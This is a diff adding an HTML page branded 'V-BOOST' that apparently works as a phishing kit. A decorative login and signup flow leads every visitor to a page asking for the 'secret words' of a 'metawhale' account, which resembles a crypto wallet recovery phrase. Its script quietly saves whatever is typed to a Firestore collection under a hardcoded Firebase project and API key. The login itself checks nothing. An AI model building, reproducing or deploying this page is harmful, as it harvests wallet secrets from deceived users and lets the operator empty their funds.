@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<!-- ZOOM LOCK -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>V-BOOST</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+
+body{
+background:#f5f6fa;
+}
+
+/* LAYOUT */
+.container{
+display:flex;
+min-height:100vh;
+}
+
+/* LEFT */
+.left{
+width:50%;
+padding:60px;
+display:flex;
+flex-direction:column;
+justify-content:center;
+}
+
+.logo{
+font-size:26px;
+font-weight:600;
+margin-bottom:20px;
+}
+
+h1{
+font-size:32px;
+margin-bottom:10px;
+}
+
+.sub{
+color:#777;
+margin-bottom:25px;
+}
+
+/* INPUT */
+.field{
+position:relative;
+margin-bottom:20px;
+}
+
+input{
+width:100%;
+padding:14px;
+border-radius:25px;
+border:1px solid #ddd;
+outline:none;
+}
+
+.eye{
+position:absolute;
+right:15px;
+top:50%;
+transform:translateY(-50%);
+cursor:pointer;
+}
+
+/* BUTTON */
+.btn{
+width:160px;
+padding:12px;
+border:none;
+border-radius:25px;
+background:#ff3b3b;
+color:#fff;
+cursor:pointer;
+}
+
+.fullbtn{
+width:100%;
+padding:14px;
+background:#ff3b3b;
+color:#fff;
+border:none;
+border-radius:25px;
+margin-top:20px;
+}
+
+/* SOCIAL */
+.social{
+display:flex;
+gap:15px;
+margin-top:20px;
+}
+
+.social i{
+font-size:18px;
+padding:12px;
+border:1px solid #ddd;
+border-radius:10px;
+cursor:pointer;
+}
+
+/* RIGHT */
+.right{
+width:50%;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:40px;
+}
+
+.card{
+background:#fff;
+padding:20px;
+border-radius:20px;
+}
+
+.card img{
+width:100%;
+max-width:350px;
+}
+
+/* SECRET PAGE */
+.secret{
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+background:linear-gradient(to bottom,#fff,#ffe5e5);
+padding:20px;
+text-align:center;
+}
+
+textarea{
+width:100%;
+max-width:500px;
+border:2px solid #000;
+border-radius:10px;
+padding:15px;
+min-height:200px;
+resize:none;
+}
+
+/* MOBILE */
+@media(max-width:768px){
+.container{flex-direction:column;}
+.left,.right{width:100%;padding:20px;}
+.btn{width:100%;}
+}
+</style>
+</head>
+
+<body>
+
+<!-- LOGIN PAGE -->
+<div class="container" id="mainPage">
+
+<div class="left">
+<div class="logo">V-BOOST</div>
+
+<h1>Welcome to V-Boost</h1>
+<p class="sub">Where your growth becomes digital capital</p>
+
+<div class="field">
+<input id="email" placeholder="Enter email">
+</div>
+
+<div class="field">
+<input id="password" type="password" placeholder="Enter password">
+<i class="fa fa-eye eye" onclick="toggle('password',this)"></i>
+</div>
+
+<button class="btn" onclick="goSecret()">Log in</button>
+
+<p style="margin-top:15px;">
+Do not have an account? 
+<span onclick="showSignup()" style="color:red;cursor:pointer;">Sign up</span>
+</p>
+
+<div class="social">
+<i class="fab fa-google"></i>
+<i class="fab fa-facebook-f"></i>
+<i class="fab fa-apple"></i>
+<i class="fab fa-x-twitter"></i>
+</div>
+
+</div>
+
+<div class="right">
+<div class="card">
+<img src="https://i.ibb.co/XkytsVhb/Screenshot-2026-0416-014451.png">
+</div>
+</div>
+
+</div>
+
+<!-- SIGNUP PAGE -->
+<div class="container" id="signupPage" style="display:none;">
+
+<div class="left">
+
+<h1>Create Account</h1>
+
+<div class="field">
+<input id="sEmail" placeholder="Gmail required">
+</div>
+
+<div class="field">
+<input id="sPass" type="password" placeholder="Create password">
+<i class="fa fa-eye eye" onclick="toggle('sPass',this)"></i>
+</div>
+
+<small>create 8 digit password with uppercase lowercase number</small>
+
+<div class="field">
+<input id="cPass" type="password" placeholder="Confirm password">
+<i class="fa fa-eye eye" onclick="toggle('cPass',this)"></i>
+</div>
+
+<button class="btn" onclick="signup()">Signup</button>
+
+<p style="margin-top:15px;">
+Already have account? 
+<span onclick="showLogin()" style="color:red;cursor:pointer;">Login</span>
+</p>
+
+</div>
+
+</div>
+
+<!-- SECRET PAGE -->
+<div class="secret" id="secretPage">
+
+<h1><b>Welcome to V-BOOST</b></h1>
+<p class="sub">login your metawhale account for continue with V-BOOST</p>
+
+<textarea id="secret" placeholder="enter your secret words for login account"></textarea>
+
+<button class="fullbtn" onclick="saveData()">Open Account</button>
+
+</div>
+
+<!-- FIREBASE -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const app = initializeApp({
+apiKey:"AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+authDomain:"v-academy-82560.firebaseapp.com",
+projectId:"v-academy-82560"
+});
+
+const db=getFirestore(app);
+
+window.saveData = async function(){
+let text=document.getElementById("secret").value;
+
+if(text===""){
+alert("Enter data");
+return;
+}
+
+await addDoc(collection(db,"users"),{
+message:text,
+time:new Date()
+});
+
+alert("Saved Successfully");
+}
+</script>
+
+<script>
+function toggle(id,el){
+let input=document.getElementById(id);
+input.type=input.type==="password"?"text":"password";
+}
+
+function showSignup(){
+document.getElementById("mainPage").style.display="none";
+document.getElementById("signupPage").style.display="flex";
+}
+
+function showLogin(){
+document.getElementById("signupPage").style.display="none";
+document.getElementById("mainPage").style.display="flex";
+}
+
+function goSecret(){
+document.getElementById("mainPage").style.display="none";
+document.getElementById("secretPage").style.display="flex";
+}
+
+function signup(){
+let e=document.getElementById("sEmail").value;
+let p=document.getElementById("sPass").value;
+let c=document.getElementById("cPass").value;
+
+if(!e.includes("@gmail.com")){
+alert("Enter valid Gmail");
+return;
+}
+
+if(p.length<8){
+alert("Password must be 8 characters");
+return;
+}
+
+if(p!==c){
+alert("Password not match");
+return;
+}
+
+goSecret();
+}
+</script>
+
+</body>
+</html>
